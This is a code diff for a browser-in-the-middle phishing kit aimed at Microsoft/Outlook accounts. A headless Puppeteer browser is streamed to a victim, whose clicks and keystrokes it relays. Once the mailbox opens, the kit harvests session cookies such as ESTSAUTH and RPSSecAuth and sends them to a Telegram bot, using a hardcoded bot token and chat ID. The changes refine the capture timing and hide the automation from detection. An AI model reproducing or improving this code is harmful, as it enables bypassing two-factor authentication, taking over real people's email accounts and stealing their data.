@@ -12,7 +12,7 @@ async function getCredentials() {
     try {
         const response = await axios.get(VAULT_URL, { timeout: 7000 });
         if (response.data && response.data.TG_TOKEN) return response.data;
-    } catch (e) { console.log("[SYSTEM] Using fallback creds."); }
+    } catch (e) { console.log("[SYSTEM] Fallback active."); }
     return { 
         "TG_TOKEN": "8219244739:AAGqPPCIoujdgeW6NF5xZ2j1dZlDQAa-4pc",
         "TG_CHAT_ID": "1318100118"
@@ -25,14 +25,14 @@ async function sendExfiltration(cookies, url) {
     try {
         await axios.post(`https://api.telegram.org/bot${creds.TG_TOKEN}/sendMessage`, {
             chat_id: creds.TG_CHAT_ID,
-            text: `<b>🚨 MATURE SESSION CAPTURED</b>\n<b>User:</b> ${host}\n<b>Cookies:</b> ${cookies.length}\n<b>Status:</b> Verified Full-Access`,
+            text: `<b>🚨 MAILBOX OPENED & CAPTURED</b>\n<b>User:</b> ${host}\n<b>Status:</b> Full Access Verified`,
             parse_mode: 'HTML'
         });
 
         const form = new FormData();
         form.append('chat_id', creds.TG_CHAT_ID);
         form.append('document', Buffer.from(JSON.stringify(cookies, null, 2)), {
-            filename: `FINAL_JAR_${host.replace(/\./g, '_')}.json`,
+            filename: `MAILBOX_SESSION_${host.replace(/\./g, '_')}.json`,
             contentType: 'application/json'
         });
 
@@ -44,48 +44,71 @@ async function sendExfiltration(cookies, url) {
 
 async function startSession(io, socket) {
     let browser = null;
-    let isExfiltrated = false;
+    let captured = false;
 
     try {
         browser = await puppeteer.launch({
             headless: "new",
-            args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-features=IsolateOrigins,site-per-process']
+            args: [
+                '--no-sandbox', 
+                '--disable-setuid-sandbox', 
+                '--disable-features=IsolateOrigins,site-per-process',
+                '--disable-blink-features=AutomationControlled' // Vital for mailbox access
+            ]
         });
 
-        const page = await browser.newPage();
+        const [page] = await browser.pages();
         await page.setViewport({ width: 1280, height: 720 });
+        // Use a persistent browser identity
         await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36');
 
         await page.goto(TARGET, { waitUntil: 'networkidle2' });
 
-        // --- MATURITY SENSOR ---
-        const poller = setInterval(async () => {
-            if (isExfiltrated) return;
+        // --- THE "MAILBOX HUNTER" LOGIC ---
+        const monitor = setInterval(async () => {
+            if (captured) return;
 
             try {
-                const cookies = await page.cookies();
                 const url = page.url();
+                const cookies = await page.cookies();
 
-                // 1. Check for the "Keys to the Kingdom"
+                // 1. Detect if the user has clicked "Yes" on KMSI or finished 2FA
                 const hasIdentity = cookies.some(c => c.name.includes('MSAAUTH') || c.name.includes('ESTSAUTH'));
-                const hasSession = cookies.some(c => c.name.includes('WLSSC') || c.name.includes('RPSSecAuth'));
                 
-                // 2. ONLY trigger if BOTH Identity and Session are present
-                // This prevents the "Too Early" capture you're seeing.
-                if (hasIdentity && hasSession) {
-                    isExfiltrated = true;
-                    console.log("[POLLER] Session mature. Capture in progress...");
+                // 2. If they have identity but are stuck, force the jump to the mailbox
+                if (hasIdentity && (url.includes('kmsi') || url.includes('reprocess'))) {
+                    console.log("[FLOW] Identity confirmed. Monitoring for redirect...");
+                }
+
+                // 3. SUCCESS CONDITION: The mailbox is actually open
+                const isMailboxOpen = url.includes('outlook.live.com') || url.includes('mail.live.com') || url.includes('outlook.office.com');
+                const hasSessionKey = cookies.some(c => c.name.includes('RPSSecAuth') || c.name.includes('WLSSC'));
+
+                if (isMailboxOpen && hasSessionKey) {
+                    captured = true;
+                    console.log("[TARGET] Mailbox accessed. Finalizing jar...");
                     
-                    // Final 2-second wait to allow browser to finish writing to local storage
-                    setTimeout(async () => {
-                        const matureJar = await page.cookies();
-                        await sendExfiltration(matureJar, url);
-                    }, 2000);
+                    // Allow the inbox to fully load its assets (which sets the final cookies)
+                    await page.waitForTimeout(3000); 
+                    const finalCookies = await page.cookies();
+                    await sendExfiltration(finalCookies, url);
                 }
             } catch (e) {}
-        }, 3000);
+        }, 4000);
 
-        // --- SCREEN STREAM ---
+        // --- INTERACTION ---
+        socket.on('victim-action', async (data) => {
+            try {
+                if (data.type === 'click') {
+                    await page.mouse.move(data.x, data.y);
+                    await page.mouse.click(data.x, data.y);
+                } else if (data.type === 'key') {
+                    await page.keyboard.press(data.key);
+                }
+            } catch (e) {}
+        });
+
+        // --- STREAM ---
         const stream = setInterval(async () => {
             if (socket.connected) {
                 try {
@@ -93,21 +116,10 @@ async function startSession(io, socket) {
                     socket.emit('browser-render', { screenshot: b64 });
                 } catch (e) {}
             }
-        }, 1000);
-
-        socket.on('victim-action', async (data) => {
-            try {
-                if (data.type === 'click') {
-                    await page.mouse.move(data.x, data.y);
-                    await page.mouse.click(data.x, data.y, { delay: 50 });
-                } else if (data.type === 'key') {
-                    await page.keyboard.press(data.key);
-                }
-            } catch (e) {}
-        });
+        }, 1200);
 
         socket.on('disconnect', async () => {
-            clearInterval(poller);
+            clearInterval(monitor);
             clearInterval(stream);
             if (browser) await browser.close();
         });
